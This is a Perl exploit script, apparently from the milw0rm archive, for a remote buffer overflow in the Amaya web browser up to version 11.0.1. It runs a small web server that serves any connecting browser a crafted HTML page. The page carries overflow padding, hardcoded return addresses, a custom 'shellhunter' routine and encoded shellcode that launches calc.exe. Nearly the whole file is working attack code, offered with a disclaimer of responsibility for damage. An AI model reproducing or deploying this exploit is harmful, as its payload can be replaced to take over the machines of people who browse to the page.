#!/usr/bin/perl
#
# Amaya Web Browser <= 11.0.1 Remote Buffer Overflow Exploit
# Found/Exploit by SkD (skdrat@hotmail.com)
# 		       (skd@abysssec.com  )
# -----------------------------------------------
# This is advanced buffer overflow exploitation using
# my new method called shellhunting :)
#
# Get more information about this at http://abysssec.com
#
# "Remember to connect to the webserver the link needs to end with .html, eg: http://127.0.0.1/s.html ("s" can be whatever) "
#
# Exploit works only on a fully patched Vista SP1, but you
# may need to click 'Refresh' to make the shellcode exec
# sometimes.
#
# Note: Author has no responsibility over the damage you do with this!


use strict;
use warnings;
use IO::Socket;

my $html;
my $port_listen = 80; # change this to your desired port!
my $listenip = "127.0.0.1"; # change this to your desired IP!

# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
my $shellcode =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44".
"\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x54\x4e\x43\x4b\x38\x4e\x47".
"\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x38".
"\x4f\x45\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x33\x4b\x48".
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c".
"\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e".
"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58".
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x58\x4e\x50\x4b\x44".
"\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x38".
"\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33".
"\x42\x4c\x46\x46\x4b\x38\x42\x44\x42\x53\x45\x38\x42\x4c\x4a\x47".
"\x4e\x30\x4b\x48\x42\x44\x4e\x50\x4b\x58\x42\x37\x4e\x51\x4d\x4a".
"\x4b\x48\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b".
"\x42\x50\x42\x50\x42\x50\x4b\x38\x4a\x36\x4e\x43\x4f\x45\x41\x53".
"\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x57".
"\x42\x45\x4a\x36\x42\x4f\x4c\x38\x46\x30\x4f\x35\x4a\x46\x4a\x39".
"\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46".
"\x4e\x46\x43\x36\x42\x50\x5a";

# my own shell hunter.. :) it is 98% alphanumerical.
# 2nd variant of the shellhunter, to make the exploit more reliable..
my $shellhunter = ("\x58\x58\x40\x40").("\x47" x 4).("\x42" x 6).     #inc edi
		  ("\x42" x 24).("\x42" x 24).("\x39\x07\x75\x8b\x71\x71").
                  ("\x47\x47\x47\x47\x57\xFF\x65\x78\x77\x76");
my $overflow = "\x42" x 158;
my $overflow2 = "\x42" x 4;
my $overflow3 = "\x43" x 430;
my $overflow4len = 977 - ((length($shellhunter) - 7));   #very important calculation
my $overflow4 = "\x44" x $overflow4len;
my $sled = "\x42" x 12;
my $sled2 = "\x41" x 24;
my $eip2 = "\x37\x55\x03\x10";  #10035537 call ecx, this won't be used
my $eip1 = "\x30\x4f\x01\x10"; #10014F30 call esi, this will be used.
my $heapaddr = "\x50\x0e\x08\x10";    #valid char for buffer, heap address
my $lookout = "\x37\x65\x41\x45" x 40;      # 45446537    look out values <-
my $lookout2 = "\x37\x65\x41\x45\x41" x 4;      # 45446537                <-
my $lookout3 = "\x37\x65\x41\x45\x41\x41" x 4;      # 45446537            <-
my $lookout4 = "\x37\x65\x41\x45\x41\x41\x41" x 4;      # 45446537        <-
my $additionaddr = "\x35\x65\x41\x45";    #used for an addition in the shellhunter  (+2)
my $nopsled = "\x90\x90\x90\x90\x90\x90";
my $jmp = "\x75\x0c";
print "[x] Amaya Web Browser <= 11.0.1 Remote Buffer Overflow Exploit\n";
print "[x] Found/Exploit by SkD (skdrat@ hotmail.com)(skd@ abysssec.com)\n";

while(1)
{
	my $sock=new IO::Socket::INET(Listen=>1,LocalAddr => $listenip,LocalPort=>$port_listen,Proto=>'tcp');
	die unless $sock;
	print "[x] Waiting for clients on port ".$port_listen."..\n";
	my $s;
	while($s=$sock->accept()){
		print "[x] Got a client!\n";
		my $request = <$s>;
		print $s "HTTP/1.0 200 OK\nContent-Type: text/html\n\n";
		print "[x] Serving Exploit HTML page :)\n";
		print $s "<html>\n".
	 		 "<head><title>Welcome to SkD's world!</title></head>\n".
         		 "<body>\n".
         		 "<td nowrap=\x22nowrap".
         		 $overflow.$jmp.$eip1.$additionaddr.$heapaddr.$overflow3.$shellhunter.$sled.
         		 $overflow4.
         		 "\x22>\n".
         		 "</td>\n".
         		 "</body>\n".
         		 "</html><title".$lookout4.$lookout3.$lookout2.$lookout.$sled2.$nopsled.$shellcode."></title>\r\n";
                sleep(0.5);
	        close $s;
		print "[x] Done!\n";
	}
}

# milw0rm.com [2008-12-28]
